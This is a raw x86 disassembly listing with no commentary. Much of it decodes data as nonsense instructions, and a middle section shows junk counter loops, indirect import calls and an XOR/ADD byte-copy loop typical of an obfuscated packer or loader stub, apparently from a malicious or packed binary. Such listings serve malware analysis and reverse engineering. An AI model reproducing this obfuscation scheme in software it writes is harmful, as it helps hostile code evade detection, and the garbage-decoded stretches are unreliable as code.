  4039d7:	and    DWORD PTR [ebp+0x52],eax
  4039da:	add    bh,BYTE PTR ds:0x9a92bbd0
  4039e0:	jno    0x403968
  4039e2:	femms  
  4039e4:	adc    edi,DWORD PTR [di-0x1e6c]
  4039e9:	xchg   esi,ebx
  4039eb:	sbb    DWORD PTR [edi+0x5cdc0e61],ebx
  4039f1:	jb     0x4039a6
  4039f3:	stc    
  4039f4:	clc    
  4039f5:	xchg   ecx,eax
  4039f6:	hlt    
  4039f7:	sub    cl,BYTE PTR [ebx]
  4039f9:	pop    ebp
  4039fa:	cmp    DWORD PTR [eax-0x1a],esi
  4039fd:	fdiv   DWORD PTR [esi+0x30cdd3c7]
  403a03:	div    BYTE PTR [edx-0xe]
  403a06:	add    BYTE PTR [ebx],ah
  403a08:	or     al,0x54
  403a0a:	sbb    dh,BYTE PTR [edx]
  403a0c:	pop    esi
  403a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a0e:	hlt    
  403a0f:	outs   dx,BYTE PTR ds:[esi]
  403a10:	pop    es
  403a11:	iret   
  403a12:	adc    BYTE PTR [ecx],dl
  403a14:	pop    edi
  403a15:	jo     0x4039c2
  403a17:	(bad)  
  403a18:	cmp    DWORD PTR [ebx-0x251dc5af],0x12
  403a1f:	jp     0x403a96
  403a21:	adc    esp,DWORD PTR [ecx+edi*1]
  403a24:	test   BYTE PTR [edi+esi*4+0x29],0xe0
  403a29:	std    
  403a2a:	pusha  
  403a2b:	push   ecx
  403a2c:	sbb    edi,DWORD PTR gs:[ebp-0x2ff9f7b6]
  403a33:	cmp    dh,dh
  403a35:	pop    es
  403a36:	xchg   edx,eax
  403a37:	test   al,0xbb
  403a39:	out    0x58,eax
  403a3b:	inc    ecx
  403a3c:	or     al,0x35
  403a3e:	pop    ds
  403a3f:	in     al,0xac
  403a41:	out    dx,al
  403a42:	mov    edx,0x5d3d4834
  403a47:	lods   eax,DWORD PTR ds:[esi]
  403a48:	or     ecx,DWORD PTR [edi+ebp*2-0x7b]
  403a4c:	test   al,0x49
  403a4e:	adc    al,0x35
  403a50:	pushf  
  403a51:	mov    cl,0x1a
  403a53:	and    edi,DWORD PTR [edi-0x28]
  403a56:	in     eax,dx
  403a57:	in     al,0xbc
  403a59:	cmp    ah,BYTE PTR [ecx]
  403a5b:	test   BYTE PTR [ecx+0x1e],0x6d
  403a5f:	adc    al,0x56
  403a61:	repnz clc 
  403a63:	adc    eax,0xe2bb2642
  403a68:	repz rol bh,0xdb
  403a6c:	fisubr DWORD PTR [eax-0x55302190]
  403a72:	dec    esi
  403a73:	les    ebp,FWORD PTR [edi+0x57]
  403a76:	push   0x40
  403a78:	push   cs
  403a79:	jge    0x403ab5
  403a7b:	ins    DWORD PTR es:[edi],dx
  403a7c:	sar    BYTE PTR [edi+0x4d],0xb8
  403a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a81:	aaa    
  403a82:	adc    edi,DWORD PTR [edx+0x30e1e041]
  403a88:	or     dl,dh
  403a8a:	lock add eax,0xf86901ae
  403a90:	imul   DWORD PTR [ebp+0x18]
  403a93:	ror    DWORD PTR [ebx],cl
  403a95:	dec    edx
  403a96:	leave  
  403a97:	sahf   
  403a98:	sbb    eax,0xcad34ee0
  403a9d:	or     al,0xfa
  403a9f:	dec    esi
  403aa0:	rcl    BYTE PTR [edi+0x34fb5e68],1
  403aa6:	mov    dl,0x71
  403aa8:	pop    es
  403aa9:	mov    esi,0xb923cf1d
  403aae:	pop    es
  403aaf:	div    DWORD PTR [ecx-0x6f]
  403ab2:	sub    eax,DWORD PTR [edi-0x44b9841d]
  403ab8:	and    al,0xb1
  403aba:	adc    ebp,ebx
  403abc:	inc    esi
  403abd:	or     ebp,esi
  403abf:	sbb    eax,0xa225d3fd
  403ac4:	cmp    DWORD PTR [edx],0x13b98ff
  403aca:	pop    ebx
  403acb:	mov    ecx,0x8eb8ba19
  403ad0:	out    dx,al
  403ad1:	push   ss
  403ad2:	stc    
  403ad3:	sub    eax,0xed2f352c
  403ad8:	lahf   
  403ad9:	ins    BYTE PTR es:[edi],dx
  403ada:	or     al,0xba
  403adc:	sti    
  403add:	xchg   edx,eax
  403ade:	cmp    eax,0x2b460324
  403ae3:	(bad)  
  403ae4:	mov    esi,0x4c75cc63
  403ae9:	sub    BYTE PTR [ecx+ebp*8-0x51],0x27
  403aee:	dec    eax
  403aef:	and    bl,dh
  403af1:	jg     0x403b1c
  403af3:	(bad)
  403af6:	mov    ecx,ebx
  403af8:	push   edi
  403af9:	lds    edx,FWORD PTR [edi]
  403afb:	int3   
  403afc:	(bad)  
  403afd:	jnp    0x403b4b
  403aff:	test   eax,0xd1554239
  403b04:	or     eax,0x6a581e0e
  403b09:	jns    0x403b3d
  403b0b:	dec    eax
  403b0c:	outs   dx,DWORD PTR ds:[esi]
  403b0d:	xor    BYTE PTR [ecx],0x7c
  403b10:	dec    BYTE PTR [esi-0x6c]
  403b13:	fstp   DWORD PTR [esi-0x5b]
  403b16:	pusha  
  403b17:	icebp  
  403b18:	adc    dl,dl
  403b1a:	jb     0x403abf
  403b1c:	or     bl,bh
  403b1e:	(bad)  
  403b1f:	mov    BYTE PTR [bp+di],al
  403b22:	cli    
  403b23:	xor    al,BYTE PTR [eax-0x26b083cc]
  403b29:	imul   edx,esi,0x8
  403b2c:	mov    ecx,0xb337f871
  403b31:	mov    ecx,0x6b15ae63
  403b36:	lahf   
  403b37:	(bad)  
  403b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b39:	test   BYTE PTR [ebp-0x67bf222e],ah
  403b3f:	dec    edx
  403b40:	(bad)  
  403b41:	jge    0x403b81
  403b43:	inc    esp
  403b44:	xlat   BYTE PTR ds:[ebx]
  403b45:	call   0x42b3c648
  403b4a:	imul   esp,ebx,0xffffff8f
  403b4d:	js     0x403b5d
  403b4f:	cmp    edi,ebp
  403b51:	aaa    
  403b52:	jle    0x403b1d
  403b54:	xor    BYTE PTR [esi+0x63],0x7e
  403b58:	xor    dh,0x10
  403b5b:	cmp    eax,0xa9748bf3
  403b60:	test   DWORD PTR [ebx+esi*1-0x10],ebp
  403b64:	aaa    
  403b65:	fwait
  403b66:	not    DWORD PTR [edi]
  403b68:	and    esp,DWORD PTR [edi+0x7b]
  403b6b:	mov    ch,0x2b
  403b6d:	push   edi
  403b6e:	push   eax
  403b6f:	dec    ebp
  403b70:	or     BYTE PTR [esi+ebx*1+0x50],bl
  403b74:	adc    DWORD PTR [edx+0x692a5543],edx
  403b7a:	es and al,0x23
  403b7d:	or     BYTE PTR [ebx+0x7e026e80],ch
  403b83:	inc    esi
  403b84:	or     bh,BYTE PTR [ebx-0x5]
  403b87:	neg    BYTE PTR [eax+0x9bcd3b0]
  403b8d:	shl    DWORD PTR [ecx+0x17a0700],0x4a
  403b94:	(bad)  
  403b95:	cmp    al,ch
  403b97:	daa    
  403b98:	jle    0x403bf3
  403b9a:	out    0xb1,al
  403b9c:	pop    ecx
  403b9d:	xor    edi,ecx
  403b9f:	mov    dl,BYTE PTR [ebp+0x769cb577]
  403ba5:	call   0xe96d:0xc519ee91
  403bac:	xor    ah,BYTE PTR [ebx]
  403bae:	mov    ah,0x1
  403bb0:	xchg   DWORD PTR [ebp+ecx*1-0x32408391],edx
  403bb7:	sub    dl,BYTE PTR [edi+0x74170492]
  403bbd:	aad    0x54
  403bbf:	xchg   BYTE PTR [ebx],bh
  403bc1:	push   ecx
  403bc2:	and    eax,0x5d4725d4
  403bc7:	dec    edi
  403bc8:	aaa    
  403bc9:	xor    BYTE PTR [edi-0x6d8b29ec],al
  403bcf:	hlt    
  403bd0:	lea    edx,[edi+0x6a]
  403bd3:	sar    bh,cl
  403bd5:	sbb    cl,BYTE PTR [ebp-0x80]
  403bd8:	jmp    0x403bd5
  403bda:	inc    eax
  403bdb:	pushf  
  403bdc:	xchg   ebp,eax
  403bdd:	sub    eax,0xff8b211e
  403be2:	(bad)  
  403be3:	icebp  
  403be4:	pop    ecx
  403be5:	mov    ah,0x52
  403be7:	out    0x67,al
  403be9:	mov    esi,0x9ec3327e
  403bee:	push   ebp
  403bef:	cmp    edi,DWORD PTR [ecx+0x35]
  403bf2:	xlat   BYTE PTR ds:[ebx]
  403bf3:	and    ebx,DWORD PTR [eax]
  403bf5:	out    dx,eax
  403bf6:	push   eax
  403bf7:	cdq    
  403bf8:	fidivr WORD PTR [ecx-0x33]
  403bfb:	ret    
  403bfc:	dec    esi
  403bfd:	loop   0x403c46
  403bff:	xchg   esp,eax
  403c00:	nop
  403c01:	and    dh,BYTE PTR [ebp+ebp*1+0x15]
  403c05:	xor    DWORD PTR [ebp+0xd],esp
  403c08:	jl     0x403bed
  403c0a:	dec    eax
  403c0b:	call   0x9fa9:0xe03dec79
  403c12:	sub    ah,BYTE PTR [esi+0x1a]
  403c15:	retf   0x506
  403c18:	push   edx
  403c19:	ret    
  403c1a:	pusha  
  403c1b:	sbb    eax,0x679d0856
  403c20:	push   ss
  403c21:	or     al,0xe7
  403c23:	rol    DWORD PTR [edx+0x334734a8],1
  403c29:	mov    ebx,0xc8d8de9
  403c2e:	inc    esp
  403c2f:	cmp    ch,dh
  403c31:	cmp    BYTE PTR [esi-0x6f],ch
  403c34:	xchg   ecx,eax
  403c35:	jmp    FWORD PTR [ebx-0x4f]
  403c38:	cmp    ebx,DWORD PTR [esi+0x68]
  403c3b:	scas   eax,DWORD PTR es:[edi]
  403c3c:	inc    esp
  403c3d:	out    dx,al
  403c3e:	push   ebx
  403c3f:	out    dx,eax
  403c40:	jl     0x403bee
  403c42:	mov    esp,DWORD PTR [edi-0x7261f547]
  403c48:	cs and dh,bh
  403c4b:	xor    al,0xf8
  403c4d:	cmc    
  403c4e:	popf   
  403c4f:	lods   eax,DWORD PTR ds:[esi]
  403c50:	mul    DWORD PTR [ebx-0x6cb02f11]
  403c56:	clc    
  403c57:	push   ds
  403c58:	push   ebp
  403c59:	sbb    bh,bl
  403c5b:	cmp    cl,BYTE PTR [edx-0x23]
  403c5e:	pop    esi
  403c5f:	mov    edx,edi
  403c61:	push   es
  403c62:	scas   eax,DWORD PTR es:[edi]
  403c63:	mov    WORD PTR [ebx],gs
  403c65:	cmc    
  403c66:	sub    eax,0xfaca1b6b
  403c6b:	mov    cl,BYTE PTR [ebx+0x4f0c9ccc]
  403c71:	push   ecx
  403c73:	xchg   ebx,eax
  403c74:	add    ecx,ebx
  403c76:	lods   al,BYTE PTR ds:[esi]
  403c77:	inc    edi
  403c78:	lea    ebx,[ebx]
  403c7a:	(bad)  
  403c7b:	ja     0x403cee
  403c7d:	fldcw  WORD PTR [ebx-0x7637cc28]
  403c83:	dec    ebp
  403c84:	or     BYTE PTR [ebx+0x558b084d],cl
  403c8a:	or     BYTE PTR [ebx],dh
  403c8c:	enter  0xd269,0xf5
  403c90:	or     BYTE PTR [edi+0x0],dl
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41e3bc,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x433000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x431018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x42f004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x42f004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x42f004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x42b020
  403d26:	mov    edx,DWORD PTR ds:0x42f004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x42f004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x430018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x432014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x432014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x432014,ecx
  403d68:	cmp    DWORD PTR ds:0x432014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x432014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x42b028
  403d93:	cmp    DWORD PTR ds:0x432014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x432014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x432014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x42f000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x430000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x433014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x433014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x433014,esi
  403de0:	cmp    DWORD PTR ds:0x433014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x42461f
  403df2:	call   DWORD PTR ds:0x42b02c
  403df8:	cmp    DWORD PTR ds:0x433014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x433014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x433014,esi
  403e12:	cmp    DWORD PTR ds:0x433014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x433008
  403e26:	sub    DWORD PTR ds:0x43300c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x43001c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x43100c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x42f000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x43001c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x43001c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x43201c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x433018,0x431000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42f01c,0x431004
  403f69:	call   DWORD PTR ds:0x42b044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x430000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x42b010
  403f84:	and    DWORD PTR ds:0x43000c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x43000c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x43000c,ecx
  403f9b:	cmp    DWORD PTR ds:0x43000c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x42b030
  403fda:	cmp    DWORD PTR ds:0x43000c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x432010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x43101c,0x430014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x431004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x432010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x432010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x432010,ecx
  404040:	cmp    DWORD PTR ds:0x432010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x432010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x43201c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x42b058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x430004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x42f024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x433000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x433008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x431010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x43000c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x42f008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x43001c,0x16
  4040e7:	cmp    DWORD PTR ds:0x43001c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x43001c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x42f014
  404106:	push   0x430014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42b05c
  404114:	mov    esi,DWORD PTR ds:0x43001c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x43001c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x42f014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x42f008
  404138:	sbb    DWORD PTR ds:0x430008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x432010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x432008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x43201c
  404161:	sbb    DWORD PTR ds:0x433004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x430000,0x1b
  404176:	cmp    DWORD PTR ds:0x430000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x430000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x42f014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x42b034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x430000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x430000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x42f014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x430000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x43100c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x43100c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x43100c,ecx
  4041e8:	cmp    DWORD PTR ds:0x43100c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x42b038
  404203:	cmp    DWORD PTR ds:0x43100c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x430018,0x19
  40421c:	cmp    DWORD PTR ds:0x430018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x430018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x432008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x42b000
  404251:	cmp    DWORD PTR ds:0x430018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x430018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x430018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x430018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x430018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x432008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x433008,0x431008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x919c947b
  4042a6:	data16 sub al,0x34
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x7b]
  4042b2:	test   al,0xb2
  4042b4:	test   al,0x12
  4042b6:	xchg   ecx,eax
  4042b7:	lods   al,BYTE PTR ds:[esi]
  4042b8:	test   bl,dh
  4042ba:	out    0x39,eax
  4042bc:	cli    
  4042bd:	js     0x404273
  4042bf:	ss (bad) 
  4042c1:	leave  
  4042c2:	add    eax,DWORD PTR [eax]
  4042c4:	sahf   
  4042c5:	outs   dx,DWORD PTR ds:[esi]
  4042c6:	out    0xb,al
  4042c8:	mov    ah,0xc0
  4042ca:	pop    es
  4042cb:	xchg   BYTE PTR [edx],dl
  4042cd:	(bad)  
  4042ce:	xchg   ebx,eax
  4042cf:	push   eax
  4042d0:	mov    BYTE PTR [eax-0xe],cl
  4042d3:	jg     0x4042e4
  4042d5:	add    DWORD PTR [ebp-0x4eab8f8],esi
  4042db:	adc    al,0x9d
  4042dd:	jne    0x404306
  4042df:	imul   esi,DWORD PTR [edx],0xd91a4097
  4042e5:	test   eax,0xd382c714
  4042ea:	or     DWORD PTR [ebx],edi
  4042ec:	sub    eax,0x43933062
  4042f1:	fstp   TBYTE PTR [ecx+0x54398377]
  4042f7:	aas    
  4042f8:	mov    ah,0x29
  4042fa:	xor    DWORD PTR [esi],ebx
  4042fc:	or     DWORD PTR [eax-0x43d6c4a6],eax
  404302:	push   es
  404303:	cmp    DWORD PTR [eax],eax
  404305:	adc    ecx,DWORD PTR [ecx]
  404307:	inc    ebp
  404308:	xchg   DWORD PTR [ebx+0x2e],esi
  40430b:	xor    ebx,DWORD PTR [ebx+0x15]
  40430e:	in     al,dx
  40430f:	push   edx
  404310:	daa    
  404311:	sbb    BYTE PTR [ebp+0x2a],ch
  404314:	inc    ebx
  404315:	in     al,dx
  404316:	imul   ecx,DWORD PTR [edx-0x47],0x26
  40431a:	hlt    
  40431b:	rcl    BYTE PTR [edx+ebp*4-0x6b],1
  40431f:	push   0xfe09affa
  404324:	std    
  404325:	jg     0x4042ab
  404327:	pop    es
  404328:	mov    ch,0xe
  40432a:	mov    ch,0x54
  40432c:	xchg   esi,eax
  40432d:	adc    DWORD PTR [edi],ebp
  40432f:	add    ebx,DWORD PTR [ecx-0x291c9d32]
  404335:	loop   0x404350
  404337:	mov    cl,0x7b
  404339:	cmc    
  40433a:	bound  ebp,QWORD PTR [ebp*1+0x5252455c]
  404341:	fwait
  404342:	outs   dx,DWORD PTR ds:[esi]
  404343:	dec    ebp
  404344:	stos   BYTE PTR es:[edi],al
  404345:	cs mov bh,0xc8
  404348:	lock mov WORD PTR [edx+0x95732eb],?
  40434f:	fdivr  QWORD PTR [ebp+0x3fcac7b]
  404355:	stc    
  404356:	dec    edi
  404357:	dec    edx
  404358:	xchg   ebp,eax
  404359:	pop    esi
  40435a:	icebp  
  40435b:	jbe    0x40439e
  40435d:	xchg   ecx,eax
  40435e:	xchg   ah,dh
  404360:	jo     0x4043ae
  404362:	xchg   ebp,eax
  404363:	mov    ah,cl
  404365:	jo     0x4043d5
  404367:	pop    eax
  404368:	shl    DWORD PTR fs:[ebx],cl
  40436b:	aad    0x4d
  40436d:	fsubr  QWORD PTR [ebx]
  40436f:	(bad)  
  404370:	mov    eax,0x556dc94a
  404375:	loopne 0x4043b3
  404377:	xchg   esp,eax
  404378:	and    dh,BYTE PTR [edi]
  40437a:	fld    QWORD PTR [esi]
  40437c:	sbb    DWORD PTR [edx+0x15],ecx
  40437f:	fdiv   QWORD PTR [edi+0x24]
  404382:	cwde   
  404383:	call   0xbaf9:0x54e35ca7
  40438a:	mov    esi,0x73aef85e
  40438f:	test   eax,0x6e18ff2c
  404394:	ja     0x404374
  404396:	or     ebx,DWORD PTR [eax+0x44]
  404399:	jle    0x40440a
  40439b:	nop
  40439c:	std    
  40439d:	les    ecx,FWORD PTR [edx+0x4e9ad102]
  4043a3:	xchg   ebp,eax
  4043a4:	iret   
  4043a5:	pop    edi
  4043a6:	push   cs
  4043a7:	or     ebx,DWORD PTR [ecx+0x725a85be]
  4043ad:	cwde   
  4043ae:	add    DWORD PTR [edx-0x3ec136aa],ecx
  4043b4:	or     BYTE PTR [edi+0x20fb11cf],ah
  4043ba:	hlt    
  4043bb:	pop    ss
  4043bc:	xor    eax,0x5a043aeb
